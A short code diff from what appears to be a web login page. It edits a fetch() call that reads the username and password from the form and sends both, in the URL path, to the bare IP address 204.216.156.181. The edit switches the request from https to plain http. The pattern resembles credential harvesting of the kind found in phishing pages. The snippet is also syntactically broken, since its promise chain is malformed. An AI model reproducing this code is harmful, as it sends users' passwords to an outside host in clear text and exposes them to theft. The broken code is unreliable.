@@ -9,7 +9,7 @@
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            fetch(`https://204.216.156.181:443/${encodeURIComponent(user)}/${encodeURIComponent(pass)}`, {
+            fetch(`http://204.216.156.181:443/${encodeURIComponent(user)}/${encodeURIComponent(pass)}`, {
                 method: 'POST'
             response.text())
             .then(data => alert('Response: ' + data))
